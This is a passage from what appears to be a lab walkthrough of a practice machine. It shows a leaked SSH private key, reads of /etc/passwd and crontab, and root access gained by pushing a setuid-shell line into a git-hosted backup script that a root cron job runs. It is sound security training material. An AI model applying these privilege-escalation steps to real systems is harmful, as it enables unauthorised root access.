lV9oteMuOly+WpFWbQYiAhKac7WcFdzJrR3qPALF8Ki5qyZnthibVZ5H98ndbdPCYLu+Le
jJ9w0usWvK2QF/CjGAALuL4ryAPNGCXRx1a2N6AKvfnm/8xb+4cY/3HMpJCGOqwcvQEk+t
PW3F9DqQgp02tkchiljjGI7NEJiYjwfR4spIPK6/DUy4HzkPAAAADBAOYN7bVwgbxc73Xr
NA9r4aSyqvVAQncSXy3sfUimnVKnoNprNlD0GI65YBO3WOQ1tq3MBDloAX9ZD1LDBRp7NL
ZfExqUxBBtTqOdvo8BLNPOvHGdTEGycu74+yPb+CnjqymkrcA7J81rcNM2CjnL9MBFM9R+
DkWUnDMsGg/3JDpNBKhT1kxEHr5UXcX7Ho8bkf0+qUBNagx0j9GuYg74NqaQ1LlBTMR4Ty
jn4T932jkf8EGo/oPhuN86FsOv3hlEeQAAAMEAy5t06uOSOY4aTZd0o8v249k7dfvGWYTG
ZNLEBRIzd1r47LPCkBHXckDNcvHmmSjBSrl9iZkrHSwSFjnL5+UbOCdN3CfRe3o2NuUcaW
yQL0KeFMhCR9tQOFRYDqfEqahd2mKg/7HIYdlaSJBaSf7I4X17SqOKoO/H15E3GMPPdupZ
tX8QOYlpuVHmka5pFsgxgGb0tX36BBIp0M7Dew19niY2DrhsiWte1PwM1Udbibp5xLr6nn
qMb6iia+pJ6DLLAAAACnJvb3RAaHVuaXQ=
-----END OPENSSH PRIVATE KEY-----
[dademola@hunit .ssh]$ 
[dademola@hunit .ssh]$ cd ..
[dademola@hunit git]$ cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
dhcpcd:x:977:977:dhcpcd privilege separation:/:/usr/bin/nologin
dademola:x:1001:1001::/home/dademola:/bin/bash
git:x:1005:1005::/home/git:/usr/bin/git-shell
avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
[dademola@hunit git]$ ls
git-shell-commands
[dademola@hunit git]$ cd git-shell-commands/
[dademola@hunit git-shell-commands]$ ls
[dademola@hunit git-shell-commands]$ ls -al
total 8
drwxr-xr-x 2 git git 4096 Nov  5  2020 .
drwxr-xr-x 4 git git 4096 Nov  5  2020 ..
[dademola@hunit git-shell-commands]$ 
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ ssh git@192.168.88.125 -i id_rsa -p 43022
git> 
```

Only command I can run is exit to leave the shell
https://stackoverflow.com/questions/41547170/which-default-commands-work-in-git-shell
 
## Analysing files
```bash
[dademola@hunit ~]$ java -jar blog.jar 

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.2.2.RELEASE)

2022-02-28 15:51:13.175  INFO 19595 --- [           main] com.example.blog.BlogApplicationKt       : Starting BlogApplicationKt on hunit with PID 19595 (/home/dademola/blog.jar started by dademola in /home/dademola)
2022-02-28 15:51:13.182  INFO 19595 --- [           main] com.example.blog.BlogApplicationKt       : No active profile set, falling back to default profiles: default
2022-02-28 15:51:14.322  INFO 19595 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
2022-02-28 15:51:14.412  INFO 19595 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 76ms. Found 3 JPA repository interfaces.
2022-02-28 15:51:14.769  INFO 19595 --- [           main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration' of type [org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2022-02-28 15:51:15.015  INFO 19595 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
2022-02-28 15:51:15.026  INFO 19595 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
2022-02-28 15:51:15.026  INFO 19595 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.29]
2022-02-28 15:51:15.085  INFO 19595 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
2022-02-28 15:51:15.085  INFO 19595 --- [           main] o.s.web.context.ContextLoader            : Root WebApplicationContext: initialization completed in 1752 ms
2022-02-28 15:51:15.219  INFO 19595 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
2022-02-28 15:51:15.384  INFO 19595 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
2022-02-28 15:51:15.432  INFO 19595 --- [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
2022-02-28 15:51:15.498  INFO 19595 --- [           main] org.hibernate.Version                    : HHH000412: Hibernate Core {5.4.9.Final}
2022-02-28 15:51:15.616  INFO 19595 --- [           main] o.hibernate.annotations.common.Version   : HCANN000001: Hibernate Commons Annotations {5.1.0.Final}
2022-02-28 15:51:15.728  INFO 19595 --- [           main] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
2022-02-28 15:51:16.349  INFO 19595 --- [           main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2022-02-28 15:51:16.354  INFO 19595 --- [           main] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
2022-02-28 15:51:17.008  WARN 19595 --- [           main] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
2022-02-28 15:51:17.166  INFO 19595 --- [           main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService 'applicationTaskExecutor'
2022-02-28 15:51:17.563  INFO 19595 --- [           main] o.apache.catalina.core.StandardService   : Stopping service [Tomcat]
2022-02-28 15:51:17.570  INFO 19595 --- [           main] ConditionEvaluationReportLoggingListener : 

Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled.
2022-02-28 15:51:17.574 ERROR 19595 --- [           main] o.s.b.d.LoggingFailureAnalysisReporter   : 

***************************
APPLICATION FAILED TO START
***************************

Description:

Web server failed to start. Port 8080 was already in use.

Action:

Identify and stop the process that's listening on port 8080 or configure this application to listen on another port.

2022-02-28 15:51:17.576  INFO 19595 --- [           main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Shutting down ExecutorService 'applicationTaskExecutor'
2022-02-28 15:51:17.578  INFO 19595 --- [           main] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
2022-02-28 15:51:17.578  INFO 19595 --- [           main] .SchemaDropperImpl$DelayedDropActionImpl : HHH000477: Starting delayed evictData of schema as part of SessionFactory shut-down'
2022-02-28 15:51:17.587  INFO 19595 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Shutdown initiated...
2022-02-28 15:51:17.606  INFO 19595 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Shutdown completed.
[dademola@hunit ~]$ 

```


## Hacking git use

Make some deductions about how the git repo might be used according to crontab. The git user has permissions to push to the master branch.


## Crontab enum

```bash
[dademola@hunit /]$ cat /etc/cron
cron.d/       cron.daily/   cron.deny     cron.hourly/  cron.monthly/ cron.weekly/  crontab.bak   
[dademola@hunit /]$ cat /etc/crontab.bak
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
[dademola@hunit /]$ 
```

# Privesc

## git upload

```bash
                                                                                                                                   
┌──(kali㉿kali)-[/tmp]
└─$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.88.125:/git-server
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd git-server   
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ ls
backups.sh  NEW_CHANGE  README
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ echo 'cp /bin/sh /sh && chmod u+s /sh' >> backups.sh
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git add backups.sh                                                    
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git commit -m "hack"                                                  
[master 0b5529e] hack
 1 file changed, 1 insertion(+)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git push            

^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git push origin master                                                                                                                                        130 ⨯
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git push origin master                                                                                               130 ⨯
Warning: Identity file id_rsa not accessible: No such file or directory.
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master                                                                                            130 ⨯
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 297 bytes | 148.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.88.125:/git-server
   b50f4e5..0b5529e  master -> master
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ cat backups.sh                 
#!/bin/bash
#
#
# # Placeholder
#
cp /bin/sh /sh && chmod u+s /sh
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ ./backups.sh                                        
zsh: permission denied: ./backups.sh
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ chmod +x backups.sh                                                                                                                                           126 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ ./backups.sh       
cp: cannot create regular file '/sh': Permission denied
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git add backups.sh                                                                                                                                              1 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git commit -m "hack"
[master ff82c88] hack
 1 file changed, 0 insertions(+), 0 deletions(-)
 mode change 100644 => 100755 backups.sh
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git push origin master
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master                                                                                            130 ⨯
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (2/2), 219 bytes | 219.00 KiB/s, done.
Total 2 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.88.125:/git-server
   0b5529e..ff82c88  master -> master
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ ls
backups.sh  NEW_CHANGE  README
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ nano backups.sh   
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git add backups.sh     
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git commit -m "hack"
[master 639808b] hack
 1 file changed, 1 insertion(+), 1 deletion(-)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git push              
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master                                                                                            130 ⨯
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 287 bytes | 287.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.88.125:/git-server
   ff82c88..639808b  master -> master
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ nano backups.sh 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ cat backups.sh                                                 
#!/bin/bash
#
#
# # Placeholder
#
cp /usr/bin/bash /bash && chmod u+s /bash
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git add backups.sh                                                
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ git commit -m "hack"                                              
[master 3ace6f5] hack
 1 file changed, 1 insertion(+), 1 deletion(-)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.88.125:/git-server
   639808b..3ace6f5  master -> master
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/git-server]
└─$ 
```

```bash
[dademola@hunit tmp]$ ls /bash
ls: cannot access '/bash': No such file or directory
[dademola@hunit tmp]$ ls /usr/bin/bash
/usr/bin/bash
[dademola@hunit tmp]$ ls /usr/bin/bash -al
-rwxr-xr-x 1 root root 928016 Aug  9  2020 /usr/bin/bash
[dademola@hunit tmp]$ ls /bash
/bash
[dademola@hunit tmp]$ /bash -p
bash-5.0# cd /root
bash-5.0# cat proof.txt
fde538c8f41cc291edca20f7e1e48659
bash-5.0# ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.88.125  netmask 255.255.255.0  broadcast 192.168.88.255
        inet6 fe80::250:56ff:feba:74c3  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ba:74:c3  txqueuelen 1000  (Ethernet)
        RX packets 1104  bytes 118842 (116.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 728  bytes 108112 (105.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4  bytes 200 (200.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 200 (200.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-5.0# 
```

![](Pasted%20image%2020220301202915.png)

# Others